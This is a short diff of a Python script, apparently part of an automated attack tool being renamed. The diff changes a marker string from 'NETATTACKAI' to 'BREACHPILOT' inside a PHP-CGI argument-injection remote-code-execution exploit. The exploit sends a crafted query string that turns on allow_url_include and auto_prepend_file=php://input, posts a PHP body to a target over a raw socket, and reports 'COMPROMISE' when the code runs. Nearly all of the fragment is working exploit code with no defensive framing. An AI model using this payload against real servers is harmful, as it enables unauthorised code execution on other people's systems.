@@ -618,7 +618,7 @@ PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 80
 
 if __name__ == "__main__":
     qs = urllib.parse.quote("-d allow_url_include=1 -d auto_prepend_file=php://input")
-    body = b"<?php echo 'NETATTACKAI_PHP_CGI_OK'; ?>"
+    body = b"<?php echo 'BREACHPILOT_PHP_CGI_OK'; ?>"
     s = socket.socket()
     s.settimeout(8)
     s.connect((TARGET, PORT))
@@ -632,7 +632,7 @@ if __name__ == "__main__":
     s.sendall(req)
     resp = s.recv(8192).decode(errors="replace")
     s.close()
-    if "NETATTACKAI_PHP_CGI_OK" in resp:
+    if "BREACHPILOT_PHP_CGI_OK" in resp:
         print(f"COMPROMISE: php_cgi_rce target={{TARGET}}")
     else:
         print("VULN_NOT_CONFIRMED: no PHP execution reflected")
